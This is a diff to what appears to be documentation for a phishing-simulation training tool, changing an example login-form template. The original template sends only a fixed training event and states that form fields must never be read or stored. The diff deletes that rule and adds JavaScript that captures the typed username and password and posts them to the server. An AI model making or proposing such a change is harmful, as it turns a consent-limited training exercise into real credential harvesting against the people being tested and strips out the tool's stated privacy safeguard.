@@ -158,21 +158,21 @@ const form = document.getElementById('loginForm');
 form.addEventListener('submit', (e) => {
     e.preventDefault();
 
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
     fetch('/demo', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ event: 'form-submitted' })
-    }).then((response) => {
-        if (!response.ok) {
-            throw new Error('Simulation endpoint returned an error');
-        }
-    }).catch(() => {
-        window.alert('The local simulation could not be reached. No information was collected.');
-    }).finally(() => form.reset());
+        body: JSON.stringify({
+            username: username,
+            password: password
+        })
+    });
+
+    form.reset();
 });
 ```
-
-Do not read, submit, log, or store the form fields. The built-in templates follow this rule; the server accepts only the fixed training event and does not display submitted values.
 
 5. Restart PhishSim — the new template appears automatically in the selection menu.
 
